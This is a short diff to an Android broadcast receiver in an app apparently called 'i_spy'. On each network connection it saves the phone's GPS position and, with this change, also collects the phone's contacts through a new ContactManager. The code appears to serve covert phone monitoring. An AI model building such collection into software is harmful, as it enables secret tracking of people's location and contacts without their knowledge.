@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 
+import com.um.asn.i_spy.manager.ContactManager;
 import com.um.asn.i_spy.manager.PositionGPSManager;
 import com.um.asn.i_spy.models.Phone;
 
@@ -20,12 +21,16 @@ public class ConnectionListener extends BroadcastReceiver {
         {
             System.out.println("Connected !");
 
-            System.out.println("Try save Position");
-
             Phone phone = new Phone();
             phone.loadWithFile(context);
+
+            System.out.println("Try save Position");
             PositionGPSManager posGPS = new PositionGPSManager(context, phone);
             posGPS.insertDistFromLocal();
+
+            System.out.println("Try save contacts");
+            ContactManager contact = new ContactManager(context, phone);
+            contact.run();
         }
         else{
             System.out.println("Disconnected !");
